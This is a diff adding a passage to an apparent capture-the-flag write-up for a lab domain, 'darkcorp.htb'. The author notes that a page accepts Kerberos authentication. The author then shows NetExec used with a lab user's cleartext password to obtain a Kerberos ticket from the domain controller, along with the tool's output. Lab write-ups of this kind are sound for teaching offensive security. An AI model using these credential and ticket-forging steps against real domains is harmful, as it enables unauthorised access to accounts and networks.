@@ -759,5 +759,19 @@ When browsing to it, i get prompted for a native logon, `victor.r` credentials w
 
 This page looks interesting
 
-Ill use curl to play with this request, the response show
+Ill use curl to play with this request, the response shows `negotiate` as the `www-authenticate` header, which means it accepts kerberos auth
+
+```python
+nxc smb dc-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' --generate-tgt victor
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.1     445    DC-01            [+] TGT saved to: victor.ccache
+SMB         172.16.20.1     445    DC-01            [+] Run the following command to use the TGT: export KRB5CCNAME=victor.ccache
+
+
+```
+
+
+
+
 
